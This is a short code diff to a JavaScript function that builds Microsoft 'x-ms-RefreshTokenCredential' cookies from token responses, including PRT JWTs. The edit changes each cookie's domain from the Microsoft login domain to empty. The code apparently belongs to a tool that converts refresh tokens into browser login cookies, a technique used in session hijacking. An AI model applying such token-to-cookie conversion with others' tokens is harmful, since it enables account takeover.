@@ -241,7 +241,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
     return {
       name: 'x-ms-RefreshTokenCredential',
       value: Buffer.from(credential).toString('base64'),
-      domain: '.login.microsoftonline.com',
+      domain: '', // No domain - set for current page only
     };
   }
 
@@ -253,7 +253,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
       return {
         name: 'x-ms-RefreshTokenCredential',
         value: prtJwt,
-        domain: '.login.microsoftonline.com',
+        domain: '', // No domain - set for current page only
       };
     } catch (err) {
       console.warn('[CookieConverter] PRT JWT build failed, falling back to base64:', err.message);
@@ -268,7 +268,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
     return {
       name: 'x-ms-RefreshTokenCredential',
       value: Buffer.from(credential).toString('base64'),
-      domain: '.login.microsoftonline.com',
+      domain: '', // No domain - set for current page only
     };
   }
 
@@ -281,7 +281,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
   return {
     name: 'x-ms-RefreshTokenCredential',
     value: Buffer.from(credential).toString('base64'),
-    domain: '.login.microsoftonline.com',
+    domain: '', // No domain - set for current page only
   };
 }
 
